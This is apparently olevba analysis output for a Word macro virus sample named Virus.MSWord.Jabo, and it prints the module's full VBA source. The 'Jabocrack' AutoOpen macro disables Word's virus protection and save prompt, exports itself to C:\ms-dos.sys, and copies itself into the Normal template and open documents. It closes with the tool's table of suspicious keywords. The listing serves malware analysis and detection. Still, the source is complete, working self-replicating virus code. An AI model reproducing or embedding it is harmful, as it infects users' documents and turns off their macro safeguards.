olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Jabo
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Jabo - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Jabocrack.bas 
in file: Virus.MSWord.Jabo - OLE stream: 'Macros/VBA/Jabocrack'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

Public Sub AutoOpen()
 
 Const sFileName = "C:\ms-dos.sys"
 Dim Index As Integer
 Dim NTi As Boolean
 Dim ADi As Boolean
 
 Options.VirusProtection = Not True
 Options.SaveNormalPrompt = Not True
 For Index = 1 To NormalTemplate.VBProject.VBComponents.Count
  If NormalTemplate.VBProject.VBComponents.Item(Index).Name = "Jabocrack" Then
   NTi = True: NormalTemplate.VBProject.VBComponents.Item(Index).Export (sFileName)
  End If
 Next Index
 For Index = 1 To ActiveDocument.VBProject.VBComponents.Count
  If ActiveDocument.VBProject.VBComponents.Item(Index).Name = "Jabocrack" Then
   ADi = True: ActiveDocument.VBProject.VBComponents.Item(Index).Export (sFileName)
  End If
 Next Index
 If Not NTi Then NormalTemplate.VBProject.VBComponents.Import (sFileName): NormalTemplate.Save
 
 
 
 
 If Not ADi Then ActiveDocument.VBProject.VBComponents.Import (sFileName): ActiveDocument.Save
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

